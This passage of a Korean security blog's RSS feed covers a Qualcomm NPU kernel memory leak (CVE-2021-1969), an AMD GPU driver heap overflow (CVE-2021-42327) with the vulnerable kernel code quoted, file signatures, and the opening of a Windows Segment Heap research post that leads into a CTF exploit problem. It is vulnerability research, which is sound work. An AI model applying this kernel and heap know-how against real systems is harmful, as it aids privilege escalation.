&#xBCF5;&#xC0AC;&#xB418;&#xB294; <code>msm_npu_event</code> &#xAD6C;&#xC870;&#xCCB4;&#xB294; &#xC544;&#xB798; &#xCF54;&#xB4DC;&#xC5D0;&#xC11C; &#xAC01;&#xAC01;&#xC758; &#xD544;&#xB4DC;&#xAC00; &#xCD08;&#xAE30;&#xD654;&#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c">kevt.evt.type = **MSM_NPU_EVENT_TYPE_EXEC_V2_DONE;**kevt.evt.u.exec_v2_done.network_hdl = exe_rsp_pkt-&gt;network_hdl;kevt.evt.u.exec_v2_done.exec_result = exe_rsp_pkt-&gt;header.status;kevt.evt.u.exec_v2_done.stats_buf_size = stats_size;kevt.reserved[<span class="hljs-number">0</span>] = (<span class="hljs-keyword">uint64_t</span>)network-&gt;stats_buf;kevt.reserved[<span class="hljs-number">1</span>] = (<span class="hljs-keyword">uint64_t</span>)network-&gt;stats_buf_u;<span class="hljs-keyword">if</span> (npu_queue_event(network-&gt;client, &amp;kevt))</code></pre><p>&#xC774; &#xC911; <code>msm_npu_event_execute_v2_done</code> &#xAD6C;&#xC870;&#xCCB4;&#xB294; 20 bytes &#xD06C;&#xAE30;&#xC774;&#xBA70; &#xC544;&#xB798; <code>msm_npu-event</code> &#xAD6C;&#xC870;&#xCCB4;&#xC758; union &#xD544;&#xB4DC; <code>u</code>&#xC5D0;  &#xC815;&#xC758;&#xB418;&#xC5B4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msm_npu_event</span> {</span><span class="hljs-keyword">uint32_t</span> type;<span class="hljs-keyword">union</span> {<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msm_npu_event_execute_done</span> <span class="hljs-title">exec_done</span>;</span><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msm_npu_event_execute_v2_done</span> <span class="hljs-title">exec_v2_done</span>;</span><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msm_npu_event_ssr</span> <span class="hljs-title">ssr</span>;</span><span class="hljs-keyword">uint8_t</span> data[<span class="hljs-number">128</span>];} u;<span class="hljs-keyword">uint32_t</span> reserved[<span class="hljs-number">4</span>];};</code></pre><p><code>msm_npu_event_execute_v2_done</code> &#xB97C; &#xCD08;&#xAE30;&#xD654;&#xD558;&#xBA74; <code>u</code>&#xC758; &#xB098;&#xBA38;&#xC9C0; 108 bytes (<code>data[128] - sizeof(msm_npu_event_execute_v2_done)</code>) &#xBC0F; 32 bytes &#xD06C;&#xAE30;&#xC758; <code>reserved</code> &#xD544;&#xB4DC;&#xB294; &#xCD08;&#xAE30;&#xD654;&#xB418;&#xC9C0; &#xC54A;&#xC740; &#xC0C1;&#xD0DC;&#xB85C; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; <code>npu_receive_event</code> &#xD568;&#xC218;&#xC5D0;&#xC11C; userland&#xB85C; &#xBCF5;&#xC0AC;&#xD560; &#xB54C; <code>sizeof(struct msm_npu_event)</code>&#xB85C; &#xC804;&#xCCB4; <code>msm_npu_event</code> &#xD06C;&#xAE30;&#xB9CC;&#xD07C; &#xBCF5;&#xC0AC;&#xD558;&#xBA74;&#xC11C; &#xCD08;&#xAE30;&#xD654;&#xB418;&#xC9C0; &#xC54A;&#xC740; &#xCEE4;&#xB110; &#xB370;&#xC774;&#xD130;&#xB3C4; &#xAC19;&#xC774; &#xBCF5;&#xC0AC;&#xB418;&#xACE0;, &#xC774;&#xB294; &#xCEE4;&#xB110; &#xC8FC;&#xC18C; &#xC720;&#xCD9C;&#xB85C; &#xC774;&#xC5B4;&#xC9C8; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
      
      <category domain="https://hackyboiz.github.io/tags/information-disclosure/">information disclosure</category>
      
      <category domain="https://hackyboiz.github.io/tags/kernel/">kernel</category>
      
      <category domain="https://hackyboiz.github.io/tags/qualcomm/">qualcomm</category>
      
      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
      
      <category domain="https://hackyboiz.github.io/tags/cve-2021-1969/">cve-2021-1969</category>
      
      
      <comments>https://hackyboiz.github.io/2021/11/25/l0ch/2021-11-25/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] SLUB overflow CVE-2021-42327</title>
      <link>https://hackyboiz.github.io/2021/11/23/fabu1ous/2021-11-23/</link>
      <guid>https://hackyboiz.github.io/2021/11/23/fabu1ous/2021-11-23/</guid>
      <pubDate>Tue, 23 Nov 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://docfate111.github.io/blog/securityresearch/2021/1</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://docfate111.github.io/blog/securityresearch/2021/11/08/SLUBoverflow.html">SLUB overflow CVE-2021-42327</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Linux kernel through 5.14.14</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>AMD GPU display driver debug filesystem&#xC5D0; &#xC545;&#xC758;&#xC801;&#xC778; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC804;&#xB2EC;&#xD574; Linux kernal 5.14.14 &#xC774;&#xC804; &#xBC84;&#xC804;&#xC758; AMD Radeon &#xADF8;&#xB798;&#xD53D;&#xCE74;&#xB4DC; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xC5D0;&#xC11C; heap overflow &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xBC1C;&#xC0DD;&#xC2DC;&#xD0AC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xB2E4;&#xC74C;&#xC740; amdgpu_dm_debugfs.c&#xC758; <code>parse_write_buffer_into_params()</code> &#xCF54;&#xB4DC; &#xC77C;&#xBD80;&#xBD84;&#xC785;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">parse_write_buffer_into_params</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *wr_buf, <span class="hljs-keyword">uint32_t</span> wr_buf_size,</span></span><span class="hljs-function"><span class="hljs-params">  <span class="hljs-keyword">long</span> *param, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> __user *buf,</span></span><span class="hljs-function"><span class="hljs-params">  <span class="hljs-keyword">int</span> max_param_num,</span></span><span class="hljs-function"><span class="hljs-params">  <span class="hljs-keyword">uint8_t</span> *param_nums)</span></span><span class="hljs-function"></span>{<span class="hljs-keyword">char</span> *wr_buf_ptr = <span class="hljs-literal">NULL</span>;<span class="hljs-keyword">uint32_t</span> wr_buf_count = <span class="hljs-number">0</span>;<span class="hljs-keyword">int</span> r;<span class="hljs-keyword">char</span> *sub_str = <span class="hljs-literal">NULL</span>;const char delimiter[3] = {&apos; &apos;, &apos;\\n&apos;, &apos;\\0&apos;};<span class="hljs-keyword">uint8_t</span> param_index = <span class="hljs-number">0</span>;*param_nums = <span class="hljs-number">0</span>;wr_buf_ptr = wr_buf;r = copy_from_user(wr_buf_ptr, buf, wr_buf_size); <span class="hljs-comment">//here</span><span class="hljs-keyword">if</span> (r &gt;= wr_buf_size) {DRM_DEBUG_DRIVER(<span class="hljs-string">&quot;user data not be read\\n&quot;</span>);<span class="hljs-keyword">return</span> -EINVAL;}</code></pre><p>user space&#xB85C;&#xBD80;&#xD130; 40 byte &#xD06C;&#xAE30;&#xC758; &#xD799; &#xBC84;&#xD37C;&#xC5D0; &#xB370;&#xC774;&#xD130;&#xB97C; &#xBCF5;&#xC0AC;&#xD560; &#xB54C; <code>copy_from_user</code>&#xC758; &#xD06C;&#xAE30;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB294;&#xB370;, &#xD574;&#xB2F9; &#xAC12;&#xC5D0; &#xB300;&#xD55C; &#xAC80;&#xC99D;&#xC774; &#xC5C6;&#xC5B4; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;. &#xB85C;&#xCEEC;&#xC5D0; &#xC811;&#xADFC; &#xAD8C;&#xD55C;&#xC774; &#xC788;&#xB294; &#xD574;&#xCEE4;&#xB294; &#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC0AC;&#xC6A9;&#xD574; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9;&#xC744; &#xB178;&#xB9B4; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/linux/">linux</category>
      
      <category domain="https://hackyboiz.github.io/tags/kernel/">kernel</category>
      
      <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
      
      <category domain="https://hackyboiz.github.io/tags/heap/">heap</category>
      
      <category domain="https://hackyboiz.github.io/tags/overflow/">overflow</category>
      
      
      <comments>https://hackyboiz.github.io/2021/11/23/fabu1ous/2021-11-23/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[해키피디아] File Signature</title>
      <link>https://hackyboiz.github.io/2021/11/23/y00n_nms/file-signature/</link>
      <guid>https://hackyboiz.github.io/2021/11/23/y00n_nms/file-signature/</guid>
      <pubDate>Tue, 23 Nov 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;&amp;#xD30C;&amp;#xC77C; &amp;#xC2DC;&amp;#xADF8;&amp;#xB2C8;&amp;#xCC98;(File Signature, File Magic Number)&amp;#xB294; &amp;#xD30C;&amp;#xC77C;&amp;#xC758; &amp;#xD3EC;&amp;#xB9F7;(&amp;#</description>
        
      
      
      
      <content:encoded><![CDATA[<p>&#xD30C;&#xC77C; &#xC2DC;&#xADF8;&#xB2C8;&#xCC98;(File Signature, File Magic Number)&#xB294; &#xD30C;&#xC77C;&#xC758; &#xD3EC;&#xB9F7;(&#xD615;&#xC2DD;)&#xC744; &#xC2DD;&#xBCC4;&#xD558;&#xB294; &#xACE0;&#xC720;&#xD55C; &#xBC14;&#xC774;&#xD2B8;&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xD30C;&#xC77C;&#xC758; &#xCC98;&#xC74C;&#xC5D0; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xC2DC;&#xADF8;&#xB2C8;&#xCC98;&#xB294; &#xD5E4;&#xB354;(Header), &#xD30C;&#xC77C;&#xC758; &#xB9C8;&#xC9C0;&#xB9C9;&#xC5D0; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xC2DC;&#xADF8;&#xB2C8;&#xCC98;&#xB294; &#xD478;&#xD130;(Footer)&#xB77C;&#xACE0; &#xD558;&#xBA70; &#xC774;&#xBBF8;&#xC9C0;&#xC758; &#xC2DC;&#xC791;&#xACFC; &#xB05D;&#xC774;&#xB77C;&#xACE0; &#xD574;&#xC11C; Start Of Image(SOI), End Of Image(EOI)&#xB77C;&#xACE0;&#xB3C4; &#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC608;&#xB97C; &#xB4E4;&#xC5B4; &#xD55C; &#xC774;&#xBBF8;&#xC9C0; &#xD30C;&#xC77C;&#xC774; &#xC788;&#xC744; &#xB54C; <code>FFD8FFE0</code>&#xC73C;&#xB85C; &#xC2DC;&#xC791;&#xD558;&#xACE0; <code>FFD9</code>&#xB85C; &#xB05D;&#xB098;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xD574;&#xB2F9; &#xD30C;&#xC77C;&#xC774; JPEG&#xB77C;&#xB294; &#xAC83;&#xC744; &#xC2DD;&#xBCC4;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p><img src="/2021/11/23/y00n_nms/file-signature/image.png" alt="image"></p><p><img src="/2021/11/23/y00n_nms/file-signature/image1.png" alt="image1"></p><p>&#xD30C;&#xC77C; &#xC2DC;&#xADF8;&#xB2C8;&#xCC98;&#xB294; &#xD3EC;&#xB80C;&#xC2DD;&#xACFC; &#xC545;&#xC131;&#xCF54;&#xB4DC; &#xBD84;&#xC11D;&#xC5D0;&#xC11C; &#xC790;&#xC8FC; &#xC4F0;&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xC608;&#xB97C; &#xB4E4;&#xC5B4; &#xD30C;&#xC77C; &#xCE74;&#xBE59;(File Carving)&#xC740; &#xD30C;&#xC77C; &#xC790;&#xCCB4;&#xC758; &#xBC14;&#xC774;&#xB108;&#xB9AC; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC774;&#xC6A9;&#xD574; &#xB514;&#xC2A4;&#xD06C;&#xC758; &#xBE44;&#xD65C;&#xB2F9; &#xC601;&#xC5ED;&#xC5D0;&#xC11C; &#xD30C;&#xC77C;&#xC744; &#xBCF5;&#xAD6C;&#xD558;&#xB294; &#xBC29;&#xC2DD;&#xC73C;&#xB85C;, &#xC5EC;&#xB7EC; &#xBC29;&#xC2DD; &#xC911;&#xC5D0; &#xD30C;&#xC77C; &#xC2DC;&#xADF8;&#xB2C8;&#xCC98;&#xB97C; &#xAE30;&#xBC18;&#xC73C;&#xB85C; &#xBCF5;&#xAD6C;&#xD558;&#xB294; &#xBC29;&#xC2DD;&#xC774; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xB610;&#xD55C; &#xD5E4;&#xB354;&#xC640; &#xD478;&#xD130; &#xC2DC;&#xADF8;&#xB2C8;&#xCC98;&#xAC00; &#xB2E4;&#xB978; &#xD615;&#xC2DD;&#xC77C; &#xACBD;&#xC6B0;&#xC5D0; &#xC870;&#xC791;&#xB41C; &#xD30C;&#xC77C;&#xC77C; &#xAC00;&#xB2A5;&#xC131;&#xC774; &#xC788;&#xC73C;&#xBA70;, &#xD655;&#xC7A5;&#xC790;&#xB97C; &#xBCC0;&#xACBD;&#xD55C; &#xC740;&#xB2C9; &#xD30C;&#xC77C; &#xD0D0;&#xC9C0; &#xB4F1;&#xC5D0; &#xC0AC;&#xC6A9;&#xB429;&#xB2C8;&#xB2E4;.</p><p>Windows &#xC545;&#xC131;&#xCF54;&#xB4DC; &#xBD84;&#xC11D;&#xC5D0;&#xC11C; &#xB300;&#xBD80;&#xBD84;&#xC744; &#xCC28;&#xC9C0;&#xD558;&#xB294; &#xD30C;&#xC77C;&#xC740; PE(Portable Executable)&#xD30C;&#xC77C;&#xC774;&#xBA70; &#xD655;&#xC7A5;&#xC790;&#xAC00; .exe, .dll, .pif, .drv, .qtx, .qts, .ocx, .sys&#xC778; &#xACBD;&#xC6B0;&#xAC00; &#xB9CE;&#xACE0;, &#xD574;&#xB2F9; &#xD30C;&#xC77C; &#xC2DC;&#xADF8;&#xB2C8;&#xCC98;&#xB294; <code>45 5A(MZ)</code>&#xC785;&#xB2C8;&#xB2E4;.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Hackypedia/">Hackypedia</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/y00n-nms/">y00n_nms</category>
      
      <category domain="https://hackyboiz.github.io/tags/file-signature/">file signature</category>
      
      <category domain="https://hackyboiz.github.io/tags/file-magic-number/">file magic number</category>
      
      
      <comments>https://hackyboiz.github.io/2021/11/23/y00n_nms/file-signature/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] Hip하게 Heap 정복하기 Part 3 - HITCON 2020 Michael&#39;s Storage</title>
      <link>https://hackyboiz.github.io/2021/11/21/l0ch/segment-heap-part3/</link>
      <guid>https://hackyboiz.github.io/2021/11/21/l0ch/segment-heap-part3/</guid>
      <pubDate>Sun, 21 Nov 2021 09:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;&amp;#xC548;&amp;#xB155;&amp;#xD558;&amp;#xC138;&amp;#xC694;! L0ch&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC815;&amp;#xB9D0; &amp;#xC624;&amp;#xB79C;&amp;#xB9CC;&amp;#xC5D0; &amp;#xC62C;&amp;#xB9AC</description>
        
      
      
      
      <content:encoded><![CDATA[<p>&#xC548;&#xB155;&#xD558;&#xC138;&#xC694;! L0ch&#xC785;&#xB2C8;&#xB2E4;. &#xC815;&#xB9D0; &#xC624;&#xB79C;&#xB9CC;&#xC5D0; &#xC62C;&#xB9AC;&#xB294; &#xC5F0;&#xAD6C;&#xAE00;&#xC774;&#xB124;&#xC694; &#x3160;&#x3160; &#xC5F0;&#xB9D0;&#xC5D0; &#xC77C;&#xBCF5;&#xD130;&#xC9C0;&#xB294;&#xAC74; &#xC791;&#xB144; &#xD06C;&#xB9AC;&#xC2A4;&#xB9C8;&#xC2A4; CTF&#xC5D0; &#xC774;&#xC5B4; &#xC62C;&#xD574;&#xB3C4; &#xB611;&#xAC19;&#xB2E4;&#xB2C8; &#x3160;&#x3160;&#x3160;&#x3160;&#x3160;&#x3160; &#xC774;&#xBC88; &#xD06C;&#xB9AC;&#xC2A4;&#xB9C8;&#xC2A4;&#xB3C4; &#xC5EC;&#xC720;&#xB86D;&#xAC8C; &#xBCF4;&#xB0B4;&#xAE30;&#xB294; &#xD2C0;&#xB9B0;&#xAC70;&#xACA0;&#xC8E0;,, </p><p>&#xC815;&#xC2E0;&#xC774; &#xC5C6;&#xC744;&#xC218;&#xB85D; &#xADC0;&#xC5EC;&#xC6B4;&#xAC70; &#xBCF4;&#xBA74;&#xC11C; &#xD790;&#xB9C1;&#xC744; &#xD574;&#xC57C; &#xD574;&#xC694;.. &#xADF8;&#xB798;&#xC11C; &#xC694;&#xC998; &#xC778;&#xAE30;&#xC788;&#xB294; CPU &#xC0AC;&#xC6A9;&#xB960;&#xC744; &#xC54C;&#xB824;&#xC8FC;&#xB294; &#xACE0;&#xC591;&#xC774; RunCat&#xC744; &#xC0AC;&#xC6A9;&#xD574;&#xBD24;&#xC2B5;&#xB2C8;&#xB2E4;&#x314E;&#x314E; &#xC774;&#xB984;&#xBD80;&#xD130; &#xACE0;&#xC591;&#xC774; &#xB2EC;&#xB9B0;&#xB2E4;&#xB77C;&#xB2C8;.. &#xADC0;&#xC5EC;&#xC6CC;</p><p><img src="/2021/11/21/l0ch/segment-heap-part3/Honeycam_2021-11-21_12-10-11.gif" alt="Honeycam 2021-11-21 12-10-11.gif"></p><p>CPU&#xC744; &#xC5BC;&#xB9C8;&#xB098; &#xC4F0;&#xB290;&#xB0D0;&#xC5D0; &#xB530;&#xB77C;&#xC11C; &#xACE0;&#xC591;&#xC774;&#xAC00; &#xB2EC;&#xB9AC;&#xB294; &#xC18D;&#xB3C4;&#xAC00; &#xB2EC;&#xB77C;&#xC9C0;&#xB294;&#xB370;&#xC694;, &#xD480;&#xB85C;&#xB4DC;&#xD558;&#xBA74; &#xD638;&#xB2E4;&#xB2E4;&#xB2E5; &#xB6F0;&#xB294;&#xAC8C; &#xADC0;&#xC5EC;&#xC6CC;&#xC11C; &#xADF8;&#xB9CC; &#xC9D1; &#xB370;&#xC2A4;&#xD06C;&#xD0D1;&#xC774;&#xB791; &#xB9E5;&#xBD81;&#xC5D0; &#xC804;&#xBD80; &#xAE54;&#xC544;&#xBC84;&#xB838;&#xC9C0; &#xBB50;&#xC608;&#xC694;..</p><p><img src="/2021/11/21/l0ch/segment-heap-part3/Untitled.png" alt="Untitled"></p><blockquote><p>&#xC9D1;&#xC0AC;&#xAC00; vm 4&#xAC1C;&#xB97C; &#xB3D9;&#xC2DC;&#xC5D0; &#xB3CC;&#xB9AC;&#xAE30; &#xC2DC;&#xC791;&#xD588;&#xB2E4;.</p></blockquote><p>&#xB098;&#xB9CC; &#xACE0;&#xC591;&#xC774; &#xC5C6;&#xC5B4;&#xC11C; &#xC774;&#xB807;&#xAC8C;&#xB77C;&#xB3C4; &#xB300;&#xB9AC;&#xB9CC;&#xC871; &#xD558;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;</p><p><img src="/2021/11/21/l0ch/segment-heap-part3/Untitled%201.png" alt="Untitled"></p><p>&#xC708;&#xB3C4;&#xC6B0;&#xC6A9; &#xC8FC;&#xC778;&#xB2D8;&#xC740; <a href="https://github.com/Kyome22/RunCat_for_windows/releases">https://github.com/Kyome22/RunCat_for_windows/releases</a> &#xC5D0;&#xC11C; &#xBAA8;&#xC154;&#xC624;&#xC2DC;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;!</p><p>&#xACE0;&#xC591;&#xC774; &#xC5C6;&#xB294; &#xC2AC;&#xD514;&#xC744; &#xB4A4;&#xB85C;&#xD558;&#xACE0;&#x3160; &#xC774;&#xBC88; &#xD30C;&#xD2B8;&#xC5D0;&#xC11C;&#xB294; Segment Heap&#xC758; &#xB098;&#xBA38;&#xC9C0; &#xBA54;&#xBAA8;&#xB9AC; &#xD560;&#xB2F9; &#xB9E4;&#xCEE4;&#xB2C8;&#xC998;&#xACFC; &#xAD6C;&#xC870;&#xCCB4;&#xB97C; &#xC0B4;&#xD3B4;&#xBCF4;&#xACE0;, HITCON 2020&#xC5D0; &#xB098;&#xC628; Segment Heap &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787; &#xBB38;&#xC81C;&#xB3C4; &#xC2AC;&#xCA4D; &#xAC74;&#xB4DC;&#xB824;&#xBCF4;&#xB3C4;&#xB85D; &#xD560;&#xAC8C;&#xC694;! </p><h1 id="Low-Fragmentation-Heap"><a href="#Low-Fragmentation-Heap" class="headerlink" title="Low Fragmentation Heap"></a>Low Fragmentation Heap</h1><p>LFH(Low Fragmentation Hip)&#xB294; &#xBC14;&#xC774;&#xD2B8; &#xD06C;&#xAE30;&#xAC00; 1~16,368(0x3FF0)&#xC778; &#xD560;&#xB2F9;&#xC5D0; &#xC0AC;&#xC6A9;&#xB429;&#xB2C8;&#xB2E4;. &#xC608;&#xC804;&#xC5D0; NT &#xD799;&#xC5D0;&#xC11C; &#xB098;&#xC654;&#xB358; LFH&#xC640; &#xB9C8;&#xCC2C;&#xAC00;&#xC9C0;&#xB85C; &#xC138;&#xADF8;&#xBA3C;&#xD2B8; &#xD799;&#xC758; LFH&#xB3C4; &#xB2E8;&#xD3B8;&#xD654;&#xB97C; &#xBC29;&#xC9C0;&#xD558;&#xAE30; &#xC704;&#xD574; &#xBC84;&#xD0B7; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;.</p><blockquote><p><a href="https://hackyboiz.github.io/2021/02/28/l0ch/pwncoolsexy-part2/#Low-Fragmentation-Heap">NT Heap&#xC758; Low Fragmentation Heap &#xBCF4;&#xB7EC;&#xAC00;&#xAE30;</a></p></blockquote><p>LFH &#xAD6C;&#xC131; &#xC694;&#xC18C;&#xB294; LFH &#xBE14;&#xB85D;&#xC774; &#xD560;&#xB2F9;&#xB418;&#xB294; LFH subsegment&#xB97C; &#xC0DD;&#xC131;&#xD560; &#xB54C; &#xBC31;&#xC5D4;&#xB4DC;&#xB97C; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;.<br>LFH subsegment&#xB294; &#xCCAB; &#xBC88;&#xC9F8;  page rnage descriptor&#xC758; <code>RangeFlags</code> &#xD544;&#xB4DC;&#xC5D0; <code>PAGE_RANGE_FLAGS_LFH_SUBSEGMENT(0x01)</code> &#xBE44;&#xD2B8; &#xC138;&#xD2B8;&#xAC00; &#xC788;&#xB294; &#xD2B9;&#xC218;&#xD55C; &#xBC31;&#xC5D4;&#xB4DC; &#xBE14;&#xB85D; &#xC720;&#xD615;&#xC774;&#xB77C;&#xACE0; &#xBCFC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="HEAP-LFH-CONTEXT"><a href="#HEAP-LFH-CONTEXT" class="headerlink" title="_HEAP_LFH_CONTEXT"></a>_HEAP_LFH_CONTEXT</h2><p><code>_HEAP_LFH_CONTEXT</code>&#xC5D0;&#xB294; LFH &#xBC84;&#xD0B7;, &#xC0AC;&#xC6A9;&#xC911;&#xC778; LFH &#xBC84;&#xD0B7; &#xCE74;&#xC6B4;&#xD130;, LFH &#xC0C1;&#xD0DC;&#xC640; &#xAD00;&#xB828;&#xB41C; &#xC815;&#xBCF4;&#xB97C; &#xB098;&#xD0C0;&#xB0B4;&#xB294; &#xD544;&#xB4DC;&#xAC00; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;. HeapBase&#xC758; <code>LfhContext</code> &#xD544;&#xB4DC;&#xC5D0; &#xC800;&#xC7A5;&#xB418;&#xBA70; &#xB2E4;&#xC74C; &#xD544;&#xB4DC;&#xAC00; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-number">0</span>:<span class="hljs-number">043</span>&gt; dt ntdll!_HEAP_LFH_CONTEXT -r   +<span class="hljs-number">0x000</span> BackendCtx       : Ptr64 Void   +<span class="hljs-number">0x008</span> Callbacks        : _HEAP_SUBALLOCATOR_CALLBACKS   +<span class="hljs-number">0x030</span> AffinityModArray : Ptr64 UChar   +<span class="hljs-number">0x038</span> MaxAffinity      : UChar   +<span class="hljs-number">0x048</span> SubsegmentCreationLock : Uint8B   +<span class="hljs-number">0x080</span> Buckets          : [<span class="hljs-number">129</span>] Ptr64 _HEAP_LFH_BUCKET</code></pre><ul><li><code>BackenCtx</code> : <code>_SEGMENT_HEAP</code>(HeapBase)&#xC5D0; &#xB300;&#xD55C; &#xD3EC;&#xC778;&#xD130;</li><li><code>Callbacks</code> : LFH subsegment &#xBC0F; LFH &#xCEE8;&#xD14D;&#xC2A4;&#xD2B8;&#xB97C; &#xAD00;&#xB9AC;&#xD558;&#xAE30; &#xC704;&#xD55C; &#xCF5C;&#xBC31;(&#xC778;&#xCF54;&#xB529;&#xB428;)</li><li><code>MaxAffinity</code> : &#xB9CC;&#xB4E4; &#xC218; &#xC788;&#xB294; affinity &#xC2AC;&#xB86F;&#xC758; &#xCD5C;&#xB300; &#xC218;</li><li><code>Buckets</code> : LFH &#xBC84;&#xD0B7;&#xC5D0; &#xB300;&#xD55C; &#xD3EC;&#xC778;&#xD130; &#xBC30;&#xC5F4;<ul><li>&#xBC84;&#xD0B7;&#xC774; &#xD65C;&#xC131;&#xD654;&#xB418;&#xBA74; &#xD3EC;&#xC778;&#xD130;&#xAC00; <code>_HEAP_LFH_BUCKET</code> &#xAD6C;&#xC870;&#xCCB4;&#xB97C; &#xAC00;&#xB9AC;&#xD0B4;. &#xADF8;&#xB807;&#xC9C0; &#xC54A;&#xC740; &#xACBD;&#xC6B0; LFH &#xBC84;&#xD0B7; &#xC0AC;&#xC6A9;&#xC744; &#xCD94;&#xC801;&#xD560; &#xB54C; &#xC0AC;&#xC6A9;&#xB418;&#xB294; <code>_HEAP_LFH_ONDEMAND_POINTER</code> &#xAD6C;&#xC870;&#xCCB4;&#xB97C; &#xAC00;&#xB9AC;&#xD0B4;</li></ul></li></ul><h2 id="HEAP-LFH-ONDEMAND-POINTER"><a href="#HEAP-LFH-ONDEMAND-POINTER" class="headerlink" title="_HEAP_LFH_ONDEMAND_POINTER"></a>_HEAP_LFH_ONDEMAND_POINTER</h2><p>&#xC5B8;&#xAE09;&#xD588;&#xB4EF;&#xC774; LFH &#xBC84;&#xD0B7;&#xC774; &#xBE44;&#xD65C;&#xC131;&#xD654;&#xB41C; &#xACBD;&#xC6B0; <code>LfhContext.Buckets</code> &#xC774; &#xC0AC;&#xC6A9;&#xB7C9; &#xCE74;&#xC6B4;&#xD130;&#xAC00; &#xB418;&#xBA70; &#xD544;&#xB4DC; &#xC815;&#xBCF4;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-number">0</span>:<span class="hljs-number">029</span>&gt; dt ntdll!_HEAP_LFH_ONDEMAND_POINTER   +<span class="hljs-number">0x000</span> Invalid          : Pos <span class="hljs-number">0</span>, <span class="hljs-number">1</span> Bit   +<span class="hljs-number">0x000</span> AllocationInProgress : Pos <span class="hljs-number">1</span>, <span class="hljs-number">1</span> Bit   +<span class="hljs-number">0x000</span> Spare0           : Pos <span class="hljs-number">2</span>, <span class="hljs-number">14</span> Bits   +<span class="hljs-number">0x002</span> UsageData        : Uint2B   +<span class="hljs-number">0x000</span> AllBits          : Ptr64 Void</code></pre><ul><li><code>Invalid</code> : &#xD574;&#xB2F9; &#xAD6C;&#xC870;&#xCCB4;&#xAC00; &#xBC84;&#xD0B7; &#xC0AC;&#xC6A9; &#xCE74;&#xC6B4;&#xD130;&#xC778;&#xC9C0; &#xD655;&#xC778;&#xD558;&#xAE30; &#xC704;&#xD55C; &#xB9C8;&#xCEE4;</li><li><code>UsageData</code> : LFH &#xBC84;&#xD0B7; &#xC0AC;&#xC6A9;&#xB7C9;&#xC744; &#xC124;&#xBA85;&#xD558;&#xB294; WORD &#xD06C;&#xAE30;&#xC758; &#xAC12;<ul><li>&#xBE44;&#xD2B8; 0~4&#xB294; &#xBC84;&#xD0B7; &#xD560;&#xB2F9;&#xC2DC; 